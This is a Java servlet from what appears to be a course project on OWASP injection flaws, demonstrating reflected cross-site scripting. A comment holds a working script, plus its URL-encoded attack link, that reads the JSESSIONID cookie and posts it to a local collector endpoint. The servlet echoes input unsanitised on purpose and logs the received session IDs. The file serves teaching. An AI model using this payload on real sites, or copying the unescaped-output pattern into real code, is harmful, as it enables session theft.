package com.itbulls.learnit.onlinestore.web.owasp.i.problem;

import jakarta.servlet.http.HttpServlet;
import java.io.IOException;

import com.itbulls.learnit.onlinestore.core.facades.ProductFacade;
import com.itbulls.learnit.onlinestore.core.facades.impl.DefaultProductFacade;
import com.itbulls.learnit.onlinestore.persistence.enteties.Product;
import com.itbulls.learnit.onlinestore.web.Configurations;

import jakarta.servlet.ServletException;
import jakarta.servlet.annotation.WebServlet;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;

/*

Script for Injection

<script>
function getJSessionId(){
    var jsId = document.cookie.match(/JSESSIONID=[^;]+/);
    if(jsId != null) {
        if (jsId instanceof Array)
            jsId = jsId[0].substring(11);
        else
            jsId = jsId.substring(11);
    }
    return jsId;
}
var url = "http://localhost:8080/online-store.web/refl-xss-demo";

var xhr = new XMLHttpRequest();
xhr.open("POST", url);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
var params = "sessionId=" + getJSessionId();

xhr.onreadystatechange = function () {
   if (xhr.readyState === 4) {
      console.log(xhr.status);
      console.log(xhr.responseText);
   }};

xhr.send(params);
</script>

URL with the encoded script 
http://localhost:8080/online-store.web/refl-xss-demo?id=1&discountCoupon=%3Cscript%3E%0Afunction%20getJSessionId%28%29%7B%0A%20%20%20%20var%20jsId%20%3D%20document.cookie.match%28%2FJSESSIONID%3D%5B%5E%3B%5D%2B%2F%29%3B%0A%20%20%20%20if%28jsId%20%21%3D%20null%29%20%7B%0A%20%20%20%20%20%20%20%20if%20%28jsId%20instanceof%20Array%29%0A%20%20%20%20%20%20%20%20%20%20%20%20jsId%20%3D%20jsId%5B0%5D.substring%2811%29%3B%0A%20%20%20%20%20%20%20%20else%0A%20%20%20%20%20%20%20%20%20%20%20%20jsId%20%3D%20jsId.substring%2811%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20return%20jsId%3B%0A%7D%0Avar%20url%20%3D%20%22http%3A%2F%2Flocalhost%3A8080%2Fonline-store.web%2Frefl-xss-demo%22%3B%0A%0Avar%20xhr%20%3D%20new%20XMLHttpRequest%28%29%3B%0Axhr.open%28%22POST%22%2C%20url%29%3B%0Axhr.setRequestHeader%28%27Content-type%27%2C%20%27application%2Fx-www-form-urlencoded%27%29%3B%0Avar%20params%20%3D%20%22sessionId%3D%22%20%2B%20getJSessionId%28%29%3B%0A%0Axhr.onreadystatechange%20%3D%20function%20%28%29%20%7B%0A%20%20%20if%20%28xhr.readyState%20%3D%3D%3D%204%29%20%7B%0A%20%20%20%20%20%20console.log%28xhr.status%29%3B%0A%20%20%20%20%20%20console.log%28xhr.responseText%29%3B%0A%20%20%20%7D%7D%3B%0A%0Axhr.send%28params%29%3B%0A%3C%2Fscript%3E  

 */


@WebServlet("/refl-xss-demo")
public class ReflectedXssServletDemo extends HttpServlet {
	
	private ProductFacade productFacade = DefaultProductFacade.getInstance();

	protected void doGet(HttpServletRequest request, HttpServletResponse response)
			throws ServletException, IOException {
		String discountCoupon = request.getParameter("discountCoupon");
		Product p = productFacade.getProductById(Integer.valueOf(request.getParameter("id")));

		request.setAttribute("product", p);
		request.setAttribute("discountCoupon", discountCoupon);

		request.getRequestDispatcher(Configurations.VIEWS_PATH_RESOLVER + "pdp-xss-demo.jsp").forward(request, response);
	}

	protected void doPost(HttpServletRequest request, HttpServletResponse response)
			throws ServletException, IOException {
		System.out.println("***** Cookies received *****");
		System.out.println(request.getParameter("sessionId"));
	}

}
